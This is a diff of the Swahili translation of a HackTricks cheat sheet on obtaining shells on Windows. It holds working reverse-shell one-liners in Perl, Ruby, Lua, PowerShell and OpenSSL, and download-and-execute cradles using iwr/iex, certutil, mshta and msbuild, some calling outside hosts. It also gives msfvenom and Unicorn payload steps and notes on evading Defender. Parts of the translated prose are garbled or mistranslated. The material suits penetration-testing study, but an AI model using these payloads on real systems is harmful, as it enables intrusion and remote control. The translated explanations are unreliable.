@@ -1,18 +1,19 @@
-# Mabua - Windows
+# Shells - Windows
+
+{% hint style="success" %}
+Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 **Kikundi cha Usalama cha Try Hard**
 
@@ -24,8 +25,8 @@ Njia nyingine za kusaidia HackTricks:
 
 ## Lolbas
 
-Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni kwa Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni kwa linux.\
-Kwa dhahiri, **hakuna faili za SUID au mamlaka ya sudo kwenye Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binari** zinaweza kutumika (kwa ubaya) kutekeleza aina fulani ya hatua zisizotarajiwa kama **kutekeleza nambari za kupindukia.**
+Ukurasa [lolbas-project.github.io](https://lolbas-project.github.io/) ni kwa ajili ya Windows kama [https://gtfobins.github.io/](https://gtfobins.github.io/) ni kwa ajili ya linux.\
+Kwa dhahiri, **hakuna faili za SUID au mamlaka ya sudo kwenye Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binari** zinavyoweza kutumika kufanya aina fulani ya vitendo visivyotarajiwa kama **utekelezaji wa nambari za kubahatisha.**
 
 ## NC
 ```bash
@@ -52,21 +53,21 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 ```
 ## Perl
 
-Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kujenga shellcode kwa mifumo ya Windows.
+Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kujenga shell kwenye mfumo wa Windows. Inatoa njia nyingi za kufanya hivyo, kama vile kutumia moduli kama vile `Net::RawIP` au `Net::Pcap`.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-## Kijivu
+### Swahili Translation
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-## Kiswahili
+Lua ni lugha ya programu ya scripting iliyoundwa kwa kasi na ufanisi. Lua inaweza kutumika kama sehemu ya mchakato wa ukiukaji wa mfumo wa Windows kwa kutekeleza hati za Lua kwenye mfumo uliokaliwa. Lua inaweza kusaidia katika kuanzisha mwingiliano wa mtumiaji wa mwisho na mifumo ya Windows.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -78,7 +79,17 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mnajisi
+### Mfano wa Shell ya Windows
+
+Unapotumia shell ya Windows kwenye mazingira ya Windows, unaweza kutumia njia zifuatazo kusaidia kudumisha ufikiaji wako kwenye mfumo wa shabiki:
+
+1. **cmd.exe**: Shell ya msingi ya Windows inayotumiwa kwa amri za msingi.
+2. **Powershell.exe**: Shell yenye nguvu zaidi inayotumiwa kwa amri za PowerShell.
+3. **wscript.exe**: Inaweza kutumika kutekeleza hati za VBScript.
+4. **cscript.exe**: Inaweza kutumika kutekeleza hati za VBScript kwenye hali ya amri.
+5. **wmic.exe**: Inaweza kutumika kutekeleza amri za WMI.
+6. **Mshta.exe**: Inaweza kutumika kutekeleza hati za HTML Application (HTA).
+7. **rundll32.exe**: Inaweza kutumika kutekeleza maktaba za DLL.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -87,8 +98,6 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
 ## Powershell
-
-Powershell ni lugha ya skripti iliyoundwa na Microsoft kwa madhumuni ya kufanya usimamizi wa mfumo na automatiseringi. Inaweza kutumika kwa ufanisi katika uchunguzi wa dijiti na upenyezaji wa mtandao.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -101,7 +110,7 @@ Mzigo ulioandikwa kwenye diski: **HAPANA** (_angalau mahali popote nilipoweza ku
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Mchakato unaoendesha wito wa mtandao: **svchost.exe**\
-Payload iliyoandikwa kwenye diski: **Hifadhi ya muda ya mteja wa WebDAV**
+Mzigo ulioandikwa kwenye diski: **Hifadhi ya ndani ya mteja wa WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -125,7 +134,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi sana kizimbe cha Koadic kwa kutumia stager hta**
+**Unaweza kupakua na kutekeleza kwa urahisi sana mzimu wa Koadic ukitumia stager hta**
 
 #### mfano wa hta
 
@@ -274,7 +283,7 @@ Pakua B64dll, itafsiri na kutekeleza.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Pakua B64exe, itafsiri na kuitekeleza.
+Pakua B64exe, itafsiri na tekeleza.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -289,7 +298,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Imegunduliwa na msaliti**
+**Kugunduliwa na msimamizi**
 
 ## PS-Bat
 ```bash
@@ -314,11 +323,11 @@ Mshambuliaji
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Mfano:
+Mkubwa:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Imegundulika**
+**Imebainika**
 
 ## **Wmic**
 
@@ -340,7 +349,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Haijagunduliwa**
 
-**Unaweza kupakua na kutekeleza kwa urahisi sana koadic zombie ukitumia stager wmic**
+**Unaweza kupakua na kutekeleza kwa urahisi sana zombi wa Koadic ukitumia stager wmic**
 
 ## Msbuild
 
@@ -349,7 +358,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 Unaweza kutumia mbinu hii kukiuka Orodha ya Maombi na vizuizi vya Powershell.exe. Kama utaulizwa na kifaa cha PS shell.\
-Pakua hii na itekeleze: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Pakua hii na kuitekeleza: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -361,9 +370,9 @@ Kusanya msimbo wa C# kwenye mashine ya mwathiriwa.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Unaweza kupakua kaboti ya C# ya nyuma hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Unaweza kupakua ganda la kurudisha nyuma la C# la msingi kutoka hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Haitambuliwi**
+**Hakijagunduliwa**
 
 ## **Regasm/Regsvc**
 
@@ -385,13 +394,13 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Mabakuli
+## Powesheli Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Katika folda ya **Shells**, kuna mabakuli mengi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_ fanya nakala ya hati na ongeza mwishoni mwa faili:
+Katika folda ya **Shells**, kuna mabaka mengi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_ fanya nakala ya hati na ongeza mwishoni mwa faili:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -399,9 +408,9 @@ Anza kuhudumia script kwenye seva ya wavuti na kuitekeleza kwenye mwisho wa muat
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender haiichunguzi kama nambari yenye nia mbaya (bado, 3/04/2019).
+Defender haiichunguzi kama nambari inayoweza kudhuru (bado, 3/04/2019).
 
-**TODO: Angalia mabakuli mengine ya nishang**
+**TODO: Angalia mabakaingine ya nishang**
 
 ### **PS-Powercat**
 
@@ -411,11 +420,11 @@ Pakua, anzisha seva ya wavuti, anzisha msikilizaji, na itekeleze kwenye mwisho w
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender haidhinishi kuwa ni msimbo mbaya (bado, 3/04/2019).
+Defender haiigundui kama nambari inayoweza kudhuru (bado, 3/04/2019).
 
-**Chaguo nyingine zinazotolewa na powercat:**
+**Chaguo zingine zinazotolewa na powercat:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, kupakia/kupakua, Zalisha mizigo, Toa faili...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -440,13 +449,13 @@ Tengeneza mizizi ya powershell, iihifadhi kwenye faili na uipakue na kuitekeleza
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Imeonekana kama msimbo mbaya**
+**Imedhamiriwa kama msimbo mbaya**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Tengeneza toleo la powershell la mlango wa nyuma wa metasploit kwa kutumia kifaa cha unicorn
+Tengeneza toleo la powershell la mlango wa nyuma wa metasploit kwa kutumia kifaa cha kichawi
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -454,15 +463,15 @@ Anza msfconsole na rasilimali iliyoundwa:
 ```
 msfconsole -r unicorn.rc
 ```
-Anza mtandao wa seva unayotoa faili ya _powershell\_attack.txt_ na tekeleza kwenye mhanga:
+Anza server ya wavuti ikitoa faili ya _powershell\_attack.txt_ na tekeleza kwa muathiriwa:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Imedetektiwa kama msimbo mbaya**
+**Imedetektiwa kama msimbo wa hatari**
 
 ## Zaidi
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console na moduli za PS zenye uchokozi zilizopakiwa mapema (zilizofichwa)\
+[PS>Shambulio](https://github.com/jaredhaight/PSAttack) PS console na moduli za PS zenye uchokozi zilizopakiwa mapema (zilizofichwa)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS console na moduli za PS zenye uchokozi na uchunguzi wa proksi (IEX)
 
@@ -482,16 +491,17 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console na moduli za PS zen
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>unga mkono HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
